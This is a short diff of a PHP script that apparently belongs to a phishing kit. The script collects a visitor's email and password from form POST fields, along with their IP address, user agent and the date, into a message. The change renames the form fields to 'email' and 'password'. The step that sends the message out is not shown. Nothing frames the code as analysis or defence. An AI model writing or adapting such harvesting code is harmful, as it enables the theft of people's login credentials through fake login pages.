@@ -4,8 +4,8 @@ $ip = getenv("REMOTE_ADDR");
 $adddate=date("D M d, Y g:i a");
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 $message .= "----------\n";
-$message .= "email: ".$_POST['ai']."\n";
-$message .= "pass: ".$_POST['pr']."\n";
+$message .= "email: ".$_POST['email']."\n";
+$message .= "pass: ".$_POST['password']."\n";
 
 $message .= "----------\n";
 $message .= "User IP : ".$ip."\n";
